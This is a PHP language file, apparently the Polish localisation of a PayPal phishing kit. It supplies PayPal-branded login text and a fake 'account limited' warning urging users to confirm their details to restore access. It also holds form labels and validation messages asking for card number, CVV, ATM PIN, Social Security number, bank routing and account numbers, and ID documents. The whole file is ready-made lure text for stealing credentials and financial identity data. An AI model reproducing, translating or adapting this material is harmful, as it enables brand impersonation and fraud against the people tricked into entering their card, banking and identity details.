<?php 
$confirmbutton = "potwierdzać";
$confirmyourinfo = "Musisz potwierdzić informacje, aby być w stanie rozwiązać ten problem i dostęp do konta";
$unabletoload = "Tymczasowo nie można załadować Twojego konta.";

$copy1 = "Copyright © 1999-".$copyright." ";
$copy2 = "Wszelkie prawa zastrzeżone.";
$wrong = "Niektóre informacje wpisane jest nie tak.";
$titlerr = "Błąd: Logowanie";
$confirm = "Potwierdź swoje konto Używaj go jak chcesz";
$topp = "Twoje bezpieczeństwo jest naszym priorytetem";
$secondarycred = "Wtórna Karta kredytowa (opcjonalnie)";
$primarycred = "Pierwotne Credit Card";
$thiscardis = "Ta karta jest VBV / MSC";
 
$page="pl_PL";
$section_n1 = true;
$section_row_fluid_editorial_editorial_right_editorial_bg_n2_lightContent_ = false;
$section_row_fluid_panel_blue_reverseLink = true;
$section_row_fluid_editorial_editorial_left_ = true;
$section_row_fluid_editorial_editorial_right_editorial_bg_n4_ = false;
$section_row_fluid_panel_light_center_text = true;
$top_title = "Płać online, wysyłaj pieniądze i akceptuj płatności";
$small_with_helper_input_0 = "Wymagany jest prawidłowy adres e-mail";
$small_with_helper_input_1 = "Wymagane jest wprowadzenie hasła";
$login_email_input_0 = "Adres e-mail";
$passwordRecovery1_a_0 = "Nie pamiętasz swojego adresu e-mail?";
$login_password_input_0 = "Hasło";
$passwordRecovery2_a_0 = "Nie pamiętasz hasła?";
$login_button_a_0 = "Zaloguj się";
$signup_button_a_0 = "Załóż konto";
$header_buy_a_0 = "Kupuj";
$header_sell_a_0 = "Sprzedawaj";
$header_send_a_0 = "Wysyłaj";
$header_business_a_0 = "Firma";
$signup_button_inner_a_0 = "Załóż konto";
$hero_h1_0 = "Pieniądze zawsze pod ręką";
$signup_subline_p_0 = "Prowadzisz własną działalność? Otwórz konto firmowe ";
$icon_help_a_0 = "Pomoc";
$icon_contact_a_0 = "Kontakt";
$icon_search_button_0 = "Wyszukaj";
$_large_h2_n1_0 = "Chcesz, to masz";
$_large_h2_row_fluid_editorial_editorial_left__0 = "Płatności? Nie ma sprawy!";
$contentHead_large_h2_row_fluid_panel_blue_reverseLink_0 = "Przelewy bez granic";
$contentHead_large_h2_row_fluid_panel_blue_reverseLink_1 = "Szybka prośba o zapłatę";
$contentPara_p_n1_0 = "Miliony klientów korzystają z PayPal z jednego prostego powodu: bo to takie łatwe. Aby zapłacić, wystarczy wpisać swój adres e-mail i hasło - zajmie Ci to mniej czasu niż wyciągnięcie portfela! ";
$contentPara_p_row_fluid_panel_blue_reverseLink_0 = "Przesyłaj pieniądze komu i gdzie chcesz – rodzinie, znajomym, sąsiadowi zza ściany i kumplowi na końcu świata. Wszystko, czego potrzebujesz, to ich adres e-mail. ";
$contentPara_p_row_fluid_panel_blue_reverseLink_1 = "Przypomnij znajomym o zwrocie pieniędzy za kino lub odbierz należność za usługę. Wystarczy adres e-mail i kilka kliknięć. Komfortowo, szybko i bez zbędnych formalności. ";
$contentPara_p_row_fluid_editorial_editorial_left__0 = "Przyjmowanie płatności nigdy nie było prostsze. Formalności? Nie zawracaj sobie tym głowy. Ty zajmij się swoim biznesem, a nam zostaw resztę. ";
$contentLink_a_n1_0 = "Płać w serwisie eBay";
$contentLink_a_n1_1 = "Płać na stronach internetowych";
$contentLink_a_row_fluid_panel_blue_reverseLink_0 = "Wyślij pieniądze";
$contentLink_a_row_fluid_panel_blue_reverseLink_1 = "Zażądaj płatności";
$contentLink_a_row_fluid_editorial_editorial_left__0 = "Akceptuj płatności online";
$contentLink_a_row_fluid_editorial_editorial_left__1 = "Wyślij fakturę online";
$closingHeadline_headline_large_p_0 = "Wydawaj pieniądze z głową ";
$btn_closing_cta_center_block_span4_a_0 = "Na zakupy z PayPal";
$footer_footer_main_secondaryLink_li = array();
$footer_footer_main_secondaryLink_li[0] = "Pomoc";
$footer_footer_main_secondaryLink_li[1] = "Kontakt";
$footer_footer_main_secondaryLink_li[2] = "Opłaty";
$footer_footer_main_secondaryLink_li[3] = "Bezpieczeństwo";
$footer_footer_main_secondaryLink_li[4] = "Opinie";
$footer_footer_main_secondaryLink_li[5] = "Zakupy";
$footer_footer_secondary_secondaryLink_li = array();
$footer_footer_secondary_secondaryLink_li[0] = "O PayPal";
$footer_footer_secondary_secondaryLink_li[1] = "Blog";
$footer_footer_secondary_secondaryLink_li[2] = "Praca";
$footer_footer_secondary_secondaryLink_li[3] = "Mapa strony";
$footer_footer_secondary_secondaryLink_li[4] = "eBay";
$footer_footer_secondary_secondaryLink_li[5] = "Deweloperzy";
$footer_footer_secondary_secondaryLink_li[6] = "Enterprise";
$footer_footer_secondary_secondaryLink_li[7] = "Partnerzy";
$footer_footer_secondary_secondaryLink_li[8] = "Feedback";
$footer_footer_tertiary_secondaryLink_li = array();
$footer_footer_tertiary_secondaryLink_li[0] = "©1999 - ".$copyright." PayPal";
$footer_footer_tertiary_secondaryLink_li[1] = "Ochrona danych";
$footer_footer_tertiary_secondaryLink_li[2] = "Umowy prawne";

$top_title2 = "Błąd — Logowanie Polska - PayPal";
$alert_alert_warning_div_0 = "Wprowadź zarówno adres e-mail, jak i hasło. Spróbuj ponownie.";
$loginheadline_p_0 = "Zaloguj się do swojego konta";
$error_span_0 = "Adres e-mail";
$error_span_1 = "Hasło";
$btn_large_input_0 = "Zaloguj się";
$pwrLinkoldflow_a_0 = "Nie pamiętasz swojego adresu e-mail lub hasła?";
$btn_btn_secondary_large_a_0 = "Załóż darmowe konto";
$headline_p_0 = "Płacisz jak chcesz.<SPAN class=headline-content>Wybierz dowolną kartę lub zapłać z salda konta PayPal.To Twoje pieniądze i to Ty decydujesz, jak je wydasz.</SPAN>";
$headline_p_1 = "Łatwo. I zazwyczaj bezpłatnie.<SPAN class=headline-content>Założenie konta PayPal nic nie kosztuje. Nie pobieramy też od Ciebie opłaty za transakcję zakupu, bez względu na to, jaką formę płatności wybierzesz.</SPAN>";
$footer_li_footer_li = array();
$footer_li_footer_li[0] = "Informacje";
$footer_li_footer_li[1] = "Typy kont";
$footer_li_footer_li[2] = "Opłaty";
$footer_li_footer_li[3] = "Zachowanie poufności";
$footer_li_footer_li[4] = "Centrum bezpieczeństwa";
$footer_li_footer_li[5] = "Kontakt z nami";
$footer_li_footer_li[6] = "Umowy prawne";
$footer_li_footer_li[7] = "Praca";
$footer_li_footer_li[8] = "Płatność zbiorcza";
$legal_p_0 = "Copyright © 1999-".$copyright." PayPal. Wszelkie prawa zastrzeżone.";

$charset = "UTF-8";
$profupdate = "Profil Aktualizacja - PayPal";
$processing = "Logowanie bezpiecznie";
$opay = "zalogowaniu - PayPal";
$ifno = "Jeśli ta strona pojawia się na więcej niż 5 sekund,";
$clickhere = "kliknij tutaj";
$reload = "przeładować.";
$logout = "Wyloguj";
$help = "pomoc";
$s_center = "Bezpieczeństwo i ochrona";
$myacc = "Moje konto";
$over = "Przegląd";
$addfound = "Dodaj fundusze";
$retirar = "wycofać";
$banktf = "Przelew na konto bankowe";
$history = "historia";
$bsearch = "Wyszukiwanie podstawowe";
$dhistory = "Pobierz historię";
$resolu = "Centrum rozstrzygania";
$opencase = "Zobacz otwarte skrzynki";
$guides = "Przewodniki";
$prof = "profil";
$addemail = "Dodaj lub edytuj Email";
$addbank = "Dodaj lub Edytuj konto bankowe";
$addcard = "Dodaj lub Edytuj Karta Kredytowa";
$addadr = "Dodaj lub edytuj adres pocztowy";
$sendmoney = "Wyślij pieniądze";
$reqmoney = "Prośba o pieniądze";
$mservices = "Merchant Services";
$autools = "Narzędzia aukcyjne";
$stra = "bezpieczna transakcja";
$puf = "modyfikacji";
$pip = "Informacje o profilu osobistego";
$acu = "Wprowadź informacje jak najdokładniej.";
$accu = "Upewnij się wprowadzić informacje dokładnie i zgodnie z formatów wymaganych.";
$filla = "Wypełnij wszystkie wymagane pola.";
$rfield = "Pole wymagane";
$ffPrenom = "Imię";
$ffNom = "Nazwisko";
$dateness = "Data urodzenia";
$month = "miesiąc";
$day = "dzień"; 
$year = "rok";
$adr1 = "Adres wiersz 1";
$adr2 = "Adres wiersz 2";
$city = "Miasto";
$state = "stan";
$zip = "Kod pocztowy";
$country = "Kraj";
$scountry = "- Wybierz kraj -";
$hpn = "Strona główna Numer telefonu";
$acpnum = "Numer ten będzie wykorzystywany do kontaktu z Tobą na temat środków bezpieczeństwa i/lub innych kwestii związanych z konta PayPal.";
$ccprof = "Karta kredytowa/debetowa profilu";
$damelacc = "Wprowadź dane karty jak najdokładniej.";
$damelacb = "Na numer karty, wpisz numery tylko proszę, nie myślników ani spacji.";
$Nomdutitulairedelacarte = "Nazwa karty";
$ccnumbr = "Numer karty";
$expbr = "Data ważności";
$cvv = "Numer weryfikacyjny karty";
$hcvv = "Pomóż znaleźć swój numer weryfikacyjny karty";
$atmm = "Twój ATM PIN";
$ssn = "Numer Social Security";
$routing="Numer banku routingu";
$account="Numer konta bankowego";
$hrouting="Pomóż znaleźć swój numer banku routingu";
$haccount="Pomóż znaleźć swój numer rachunku bankowego";
$codepersonel="Bezpieczny kod";
$IDTYPE = "Wybierz typ Id";
$Passport="paszport";
$Card_Identification="Legitymacja";
$Driving_License="Prawo jazdy";
$for1 = "Dla Twojego bezpieczeństwa, możemy sprawdzić informacje o karcie kredytowej.";
$for2 = "Proces trwa zwykle około 30 sekund, ale może to potrwać dłużej w określonych porach dnia. kliknij";
$for3 = "zaktualizować informacje.";
$spo = "zapisz profil";
$t1 = "więcej informacji";
$t2 = "o nas";
$t3 = "opinia o witrynie";
$t4 = "opłaty";
$t5 = "prywatność";
$t6 = "Centrum zabezpieczeń";
$t7 = "Kontakt z nami";
$t8 = "Umowy prawne";
$t9 = "światowy";
$t10 = "Oferty pracy";
$t11 = "Merchant Services";
$t12 = "Nasz blog";
$t13 = "Labs";
$t14 = "Skierowania";
$t15 = "Mapa strony";
$t16 = "eBay";
$t17 = "społeczność";
$fdic = "Informacja o FDIC przekazowym ubezpieczenia";
$myvar3 = "Proszę wypełnić poniższy formularz, aby zaktualizować informacje o profilu i przywrócić dostęp do konta.";
$completeform = '<div id="messageBox" class="legacyErrors"><div class="messageBox error"><p style="width: 690px; margin-bottom: 6px; margin-top: 12px;">'.$myvar3.'</p></div></div>';

$valid = array("Proszę wpisać swoje imię"
,"Nieprawidłowy Imię" //--------
,"Proszę wpisać swoje nazwisko"
,"Nieprawidłowy Nazwisko" //--------
,"Wybierz poprawny miesiąc urodzenia." //--------4
,"Wybierz poprawny urodziny." //--------
,"Wybierz poprawny rok urodzenia." //--------
,"Wpisz swój adres"
,"nieprawidłowy adres" //--------8
,"nieprawidłowy adres" //--------
,"Proszę wpisać nazwę miasta"
,"Proszę podać poprawną nazwę miasta." //--------
,"Proszę podać poprawną nazwę miasta." //--------12
,"Wybierz Kraj"
,"Wpisz swój kod pocztowy"
,"Nieprawidłowy kod pocztowy." //--------15
,"Proszę wpisać swój numer telefonu"
,"Wprowadź tylko liczby"
,"Proszę podać poprawny numer telefonu" //--------
,"Wprowadź prawidłową nazwę użytkownika karty" //--------19
,"Numer karty jest w nieprawidłowym formacie"  ////--------
,"Numer karty kredytowej jest nieprawidłowy"  //--------
,""//--------22
,""//--------
,"Wprowadź tylko liczby"
,"Proszę wybrać Data ważności - miesiąc -"
,"Proszę wybrać Data ważności - Rok -"
,"Wpisz CVV"
,"Wpisz poprawny Cvv/Cvv2 dla karty."//--------
,"nieprawidłowy Cvv/Cvv2" //--------
,"Wprowadź swój kod PIN ATM"
,"Wprowadź poprawny kod PIN ATM" //--------
,"Wprowadź poprawny kod PIN ATM" //--------
,"Podaj swój numer Social Security"
,"Nieprawidłowy numer ubezpieczenia społecznego."
,"Nieprawidłowy numer ubezpieczenia społecznego."
,"Numer Social Security tylko numer"
,"Wpisz Secure Code"
,"Nieprawidłowy kod bezpieczeństwa");
$allcountry1 = "Jesteśmy tam, gdzie nas potrzebujesz";
$allcountry2 = "Jesteśmy dostępni w 193 krajach i 26 walutach. Wydawaj i zarabiaj bezpiecznie ponad granicami i barierami językowymi. Jesteśmy tu dla Ciebie, gdziekolwiek jesteś. ";
$One_moment = "Chwila...";


$your_money = "Zdobądź więcej od pieniędzy";
$your_money_p = "Twoje konto PayPal daje bezpieczniejszy, szybszy i bardziej wygodny sposób płacenia on-line, a na telefonie komórkowym. Przechowywać swoje dane finansowe bezpiecznie z nas wtedy korzystać z konta w sklepie, przelać pieniądze lub sprzedać swoje rzeczy, aby zarobić dodatkowe pieniądze - wszystko to w zaledwie kilku kliknięć.";
$websites = "Sklep w milionach stron internetowych";
$websites_p = "PayPal jest dostępny na milionach stron internetowych na całym świecie. Tak czy kupujesz z największych detalistów lub najmniejszych specjalistów, można robić zakupy bez udostępniania swoich danych i szybkość poprzez kasy. I w zależności od tego urządzenia używasz, twoje doświadczenie PayPal będzie tak szybkie i wygodne.";
$Simply_secure = "po prostu bezpieczne";
$Simply_secure_p = "Bezpieczeństwo jest w centrum wszystkiego, co robimy. Czy to ochrony swoich danych finansowych lub zakupy, stawiamy bezpieczeństwo i spokój pierwszy. Dlatego używamy wiodącym szyfrowania i przeciwdziałania nadużyciom technologii, dlatego monitorowania transakcji 24 godziny na dobę i dlatego możemy pomóc Ci odzyskać swoje pieniądze, jeśli zakup nie przyjedzie lub nie zgadza się z jego opisem.";
$ex_date_info = "Proszę dać nam swoją datę ważności karty (mm/rrrr).";
$ex_date_empty = "Proszę dać nam swoją datę ważności karty.";
$ex_date_format = "Proszę podać prawidłową datę ważności (mm/rrrr).";
$cardholder_info = "Używać nazwy tak jak na karcie";
$card_info = "Wprowadź numer karty";
$card_format = "Numer karty jest nieprawidłowy";
$atm_info = "Wprowadź PIN atm dla tej karty.";
$account_info = "Wpisz swój numer konta bankowego";
$account_empty = "Proszę podać numer konta bankowego, aby zweryfikować konto";
$account_format = "Proszę podać poprawny numer konta bankowego";
$routing_info = "Wpisz swój numer rozliczeniowy banku";
$routing_empty = "Proszę podać swój numer banku w celu weryfikacji konta";
$routing_format = "Proszę podać numer rozliczeniowy banku obowiązuje";
$first_name = "Twoje imię";
$first_name_info = "Użyj prawną imię jak na prawo jazdy, karty ubezpieczenia społecznego lub paszportu.";
$first_name_empty = "Potrzebujemy twojej oficjalne imię, aby zweryfikować swoje konto.";
$last_name = "Twoje nazwisko";
$last_name_info = "Użyj prawną nazwisko jak na prawo jazdy, karty ubezpieczenia społecznego lub paszportu.";
$last_name_empty = "Potrzebujemy twojej prawną nazwisko do weryfikacji konta.";
$Birth_date = "Data urodzenia";
$Birth_date_empty ="Podaj nam swoją datę urodzenia.";
$Birth_date_format = "Proszę podać prawidłową datę (DD/MM/RR).";
$Birth_date_info = "Podaj nam swoją datę urodzenia (dd/mm/rrrr).";
$Address1 = "Wiersz adresu 1";
$Address1_empty = "Musimy poprawny adres do weryfikacji konta.";
$Address1_info = "Nie możemy zaakceptować PO Pudełka lub adresy biznesowe.";
$Address2 = "Wiersz adresu 2";
$City = "Miasto";
$City_empty = "Potrzebujemy miejscowość/miasto, aby zweryfikować swoje konto.";
$Postcode = "Kod pocztowy";
$Postcode_empty = "Musimy kod pocztowy, aby utworzyć nowe konto.";
$Postcode_format = "Proszę sprawdzić swój kod pocztowy dla literówek, format nie wygląda dobrze.";
$fone = "Twój numer telefonu";
$fone_empty = "Musimy swój numer telefonu, aby zweryfikować konto.";
$fone_format = "Proszę sprawdzić swój numer telefonu na literówki, format nie wygląda dobrze.";
$fone_info = "Twój numer telefonu (należy używać tylko cyfr)";
$verifyaccount = "Zweryfikuj swoje konto";
$Ownb = "Właścicielem firmy?";
$hh1 = "Twoje bezpieczne szczegóły";
$hh2 = "Twoje dane osobowe";
$pp1 = "Musimy się ważne bezpieczne dane w celu sprawdzenia konta.";
$pp2 = "Potrzebujemy trochę informacji o sobie, zanim będziemy mogli zweryfikować swoje konto.";


$type1="Strona główna";
$type2="Komórka";
$button_continue="Kontynuuj";
$button_validate="Upewnij się";

?>